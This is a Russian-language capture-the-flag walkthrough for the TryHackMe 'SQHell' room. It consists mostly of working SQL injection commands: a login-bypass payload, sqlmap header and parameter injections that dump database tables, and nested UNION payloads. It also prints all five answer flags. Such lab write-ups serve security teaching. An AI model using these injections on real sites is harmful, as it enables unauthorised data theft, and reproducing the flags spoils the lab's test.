[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [SQHell](https://tryhackme.com/r/room/sqhell) 

Всего 1 заданиe:
## Задание 1
Дайте машине минуту на загрузку, а затем подключитесь к http://MACHINE_IP

Необходимо найти 5 флагов, но вам придется преодолеть различные типы SQL- инъекций.

Подсказка: если флаги не отображаются на странице, они хранятся в таблице флагов в столбце флагов.

### Ответьте на вопросы ниже
Флаг 1
```commandline
nmap -sSCV <IP>
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirb/common.txt — wildcard php,html
sqlmap -u “http://<IP>/post/?id=2” -dbs
http://<IP>/login
username: admin' or 1=1-- -
password: whatever
```
```commandline
THM{FLAG1:E786483E5A53075750F1FA792E823BD2}
```
Флаг 2
```commandline
http://sqhell.thm/terms-and-conditions
sqlmap -u 'http://<IP>/terms-and-conditions' -H 'X-Forwarded-For: 10.10.10.10*' --risk 3 --level 5 --dbms MySQL
sqlmap -u 'http://<IP>/terms-and-conditions' -H 'X-Forwarded-For: 10.10.10.10*' --risk 3 --level 5 --dbms MySQL --dbs
sqlmap -u 'http://<IP>/terms-and-conditions' -H 'X-Forwarded-For: 10.10.10.10*' --risk 3 --level 5 --dbms MySQL -D sqhell_1 --tables
sqlmap -u 'http://<IP>/terms-and-conditions' -H 'X-Forwarded-For: 10.10.10.10*' --risk 3 --level 5 --dbms MySQL -D sqhell_1 -T flag --columns
sqlmap -u 'http://<IP>/terms-and-conditions' -H 'X-Forwarded-For: 10.10.10.10*' --risk 3 --level 5 --dbms MySQL -D sqhell_1 -T flag -C flag --dump
```

```commandline
THM{FLAG2:C678ABFE1C01FCA19E03901CEDAB1D15}
```
Флаг 3
```commandline
http://sqhell.thm/register
sqlmap -u 'http://<IP>/register/user-check?username=noraj' -p username --risk 3 --level 5 --dbms MySQL --dbs
sqlmap -u 'http://<IP>/register/user-check?username=noraj' -p username --risk 3 --level 5 --dbms MySQL -D sqhell_3 --tables
sqlmap -u 'http://<IP>/register/user-check?username=noraj' -p username --risk 3 --level 5 --dbms MySQL -D sqhell_3 -T flag --columns
sqlmap -u 'http://<IP>/register/user-check?username=noraj' -p username --risk 3 --level 5 --dbms MySQL -D sqhell_3 -T flag -C flag --dump
```
```commandline
THM{FLAG3:97AEB3B28A4864416718F3A5FAF8F308}
```
Флаг 4
```commandline
sqlmap -u 'http://<IP>/user?id=55' -p id --risk 3 --level 5 --dbms MySQL -D sqhell_4 --tables
sqlmap -u 'http://<IP>/user?id=55' -p id --risk 3 --level 5 --dbms MySQL -D sqhell_4 -T users --dump
http://<IP>/user?id=2 union all select 'noraj','is','great' from users-- -
http://<IP>/user?id=2 union all select '44 UNION SELECT 5,6,7,8-- -','is','great' from users-- -
http://<IP>/user?id=2 union all select '44 UNION SELECT 5,flag,7,8 from flag-- -','is','great' from users-- -
```
```commandline
THM{FLAG4:BDF317B14EEF80A3F90729BF2B426BEF}
```
Флаг 5
```commandline
sqlmap -u 'http://sqhell.thm/post?id=55' -p id --risk 3 --level 5 --dbms MySQL --dbs
sqlmap -u 'http://sqhell.thm/post?id=55' -p id --risk 3 --level 5 --dbms MySQL -D sqhell_5 --tables
sqlmap -u 'http://sqhell.thm/post?id=55' -p id --risk 3 --level 5 --dbms MySQL -D sqhell_5 -T flag --columns
sqlmap -u 'http://sqhell.thm/post?id=55' -p id --risk 3 --level 5 --dbms MySQL -D sqhell_5 -T flag -C flag --dump
```

```commandline
THM{FLAG5:B9C690D3B914F7038BA1FC65B3FDF3C8}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)